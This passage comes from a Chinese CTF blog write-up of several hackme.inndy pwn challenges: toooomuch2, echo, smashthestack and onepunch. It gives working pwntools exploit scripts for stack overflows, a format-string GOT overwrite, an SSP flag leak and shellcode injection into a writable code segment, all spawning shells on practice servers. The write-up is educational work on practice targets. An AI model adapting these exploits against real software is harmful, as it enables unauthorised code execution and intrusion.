<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># r = process(&apos;./toooomuch&apos;)</span><br><span class="line">r = remote(&apos;hackme.inndy.tw&apos;, 7702)</span><br><span class="line">elf=ELF(&apos;./toooomuch&apos;)</span><br><span class="line">bss= elf.bss()</span><br><span class="line">gets=elf.symbols[&apos;gets&apos;]</span><br><span class="line">sc=asm(shellcraft.sh())</span><br><span class="line">payload = &apos;a&apos;*0x1c+p32(gets)+p32(bss)+p32(bss) # junk + gets_address+ target_address  + return_address</span><br><span class="line">r.sendlineafter(&apos;passcode: &apos;,payload)</span><br><span class="line">r.sendline(sc)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>exp2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># r = process(&apos;./toooomuch&apos;)</span><br><span class="line">r = remote(&apos;hackme.inndy.tw&apos;, 7702)</span><br><span class="line">elf=ELF(&apos;./toooomuch&apos;)</span><br><span class="line"></span><br><span class="line">system=elf.symbols[&apos;system&apos;]</span><br><span class="line">passcode=elf.symbols[&apos;passcode&apos;]</span><br><span class="line"></span><br><span class="line">payload = &apos;/bin/sh\x00&apos;+&apos;a&apos;*20+p32(system)+p32(0xdeadbeaf)+p32(passcode)</span><br><span class="line">r.sendlineafter(&apos;passcode: &apos;,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>system函数的调用方法是：调用地址 + 返回地址 + 参数地址</p>
<h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+Ch] [ebp-10Ch]</span><br><span class="line">  unsigned int v4; // [esp+10Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;s, 256, stdin);</span><br><span class="line">    printf(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( strcmp(&amp;s, &quot;exit\n&quot;) );</span><br><span class="line">  system(&quot;echo Goodbye&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很简单的格式化字符串漏洞，代码里还有system函数，考虑将print的got地址覆盖成system的plt的地址，第二步输入/bin/sh，这样执行printf(‘/bin/sh’)的时候就执行了system(‘/bin/sh’)，可以用pwntools的fmt工具，确定一下偏移<code>AAAA%p%p%p%p%p%p%p%p</code>，<code>AAAA%7$8x</code>，偏移为7</p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r=process(&apos;./echo&apos;)</span><br><span class="line"># r=remote(&apos;hackme.inndy.tw&apos;, 7711)</span><br><span class="line">elf=ELF(&apos;./echo&apos;)</span><br><span class="line"></span><br><span class="line">print_got=elf.got[&apos;printf&apos;]</span><br><span class="line">system_plt=elf.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(7,&#123;print_got:system_got&#125;)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendlineafter(&apos;\n&apos;,&apos;/bin/sh\x00&apos;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="smashthestack"><a href="#smashthestack" class="headerlink" title="smashthestack"></a>smashthestack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>开启了cannary和nx<br>代码<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15600841545754.jpg" alt=""><br>先读取flag到buf，后面的read存在溢出<br>这题要利用的ssp报错的方法泄漏出flag，在ctf-wiki中有介绍：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop/#stack-smash" target="_blank" rel="noopener">stack-smash</a><br>典型的canary leak，在程序启动canary保护之后，如果发现 canary 被修改的话，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以将<strong>libc_argv[0]覆盖为存放flag的地址，在write处下断查看</strong>libc_argv[0]的偏移，<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15600845128534.jpg" alt=""><br>flag保存在bss<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15600850313828.jpg" alt=""></p>
<p>所以最后exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&apos;hackme.inndy.tw&apos;, 7717)</span><br><span class="line"># r=process(&apos;./smash-the-stack&apos;)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos; * 188 + p32(0x0804A060)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(&apos;Try to read the flag\n&apos;,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="onepunch"><a href="#onepunch" class="headerlink" title="onepunch"></a>onepunch</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [rsp+8h] [rbp-18h]</span><br><span class="line">  int v5; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  _BYTE *v6; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v7; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(_bss_start, 0LL);</span><br><span class="line">  printf(&quot;Where What?&quot;, 0LL);</span><br><span class="line">  v5 = __isoc99_scanf(&quot;%llx %d&quot;, &amp;v6, &amp;v4);</span><br><span class="line">  if ( v5 != 2 )</span><br><span class="line">    return 0;</span><br><span class="line">  *v6 = v4;//往16进制数的地址写入十进制数</span><br><span class="line">  if ( v4 == 255 )</span><br><span class="line">    puts(&quot;No flag for you&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现存在一字节的写入漏洞，但是不知道怎么利用，后来参考了其他师傅的wp，才知道怎么做。</p>
<p>运行查看各个段<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15601549051171.jpg" alt=""><br>发现代码段为rwxp权限，结合一字节任意读写，构造一个循环，写入shellcode，再跳转到shellcode就可以了，虽然开启了nx，但是不在栈上执行，所以没关系。</p>
<p>改变程序流程：<br>在ida里面查看机器码，将number修改为4<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15601733133129.jpg" alt=""></p>
<p>rename一下需要跳转到的段loc_40071D<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15601734777024.jpg" alt=""></p>
<p>然后使用keypatch来修改汇编代码，跳转到该段，使其构成一个循环<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15601736570426.jpg" alt=""></p>
<p>最终效果<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/10/15601737681747.jpg" alt=""><br>修改后，可以发现跳转处的机器码由75 0A变成了75 B4，所以就知道该怎么patch了，开始写exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&apos;amd64&apos;,log_level=&apos;debug&apos;)</span><br><span class="line"></span><br><span class="line"># r=process(&apos;./onepunch&apos;)</span><br><span class="line">r=remote(&apos;hackme.inndy.tw&apos;,7718)</span><br><span class="line"></span><br><span class="line">def patch(addr,value):</span><br><span class="line">	r.sendlineafter(&apos;Where What?&apos;,&quot;%s %s&quot; % (hex(addr), str(value)))</span><br><span class="line"></span><br><span class="line">patch(0x400768,0xb4)</span><br><span class="line"></span><br><span class="line">sc=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">addr=0x400769 # to write shellcode address</span><br><span class="line">for i,j in enumerate(sc):</span><br><span class="line">	patch(addr+i,ord(j))</span><br><span class="line"></span><br><span class="line">patch(0x400768,0xff)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>第一次写，把jnz跳转的地址（0x400768）改为main函数的地址</li>
<li>之后，分多次将shellcode一字节的写入text段的一个位置</li>
<li>最后一次输入255就跳到shellcode了</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://bbs.pediy.com/thread-246223.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246223.htm</a></li>
<li><a href="https://zszcr.github.io/2018/05/09/2018-5-9-rop-%E5%92%8C-rop2-writeup/" target="_blank" rel="noopener">https://zszcr.github.io/2018/05/09/2018-5-9-rop-%E5%92%8C-rop2-writeup/</a></li>
<li><a href="https://github.com/taoky/my-inndy-ctf-writeup/blob/master/Pwn.md" target="_blank" rel="noopener">https://github.com/taoky/my-inndy-ctf-writeup/blob/master/Pwn.md</a></li>
<li><a href="http://m4x.fun/post/hackme.inndy-writeup/" target="_blank" rel="noopener">http://m4x.fun/post/hackme.inndy-writeup/</a></li>
</ul>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#catfalg"><span class="toc-number">1.</span> <span class="toc-text">catfalg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#homework"><span class="toc-number">2.</span> <span class="toc-text">homework</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop"><span class="toc-number">3.</span> <span class="toc-text">rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop2"><span class="toc-number">4.</span> <span class="toc-text">rop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#toooomuch"><span class="toc-number">5.</span> <span class="toc-text">toooomuch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#toooomuch2"><span class="toc-number">6.</span> <span class="toc-text">toooomuch2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#echo"><span class="toc-number">7.</span> <span class="toc-text">echo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smashthestack"><span class="toc-number">8.</span> <span class="toc-text">smashthestack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#onepunch"><span class="toc-number">9.</span> <span class="toc-text">onepunch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">10.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&text=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&title=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&is_video=false&description=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=hackme.inndy pwn write-up&body=Check out this article: http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&title=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&title=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&title=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&title=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&name=hackme.inndy pwn write-up&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 zerokeeper
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<!-- clipboard -->

  <script src="/lib/clipboard/clipboard.min.js"></script>
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>

<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'zerokeeper';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
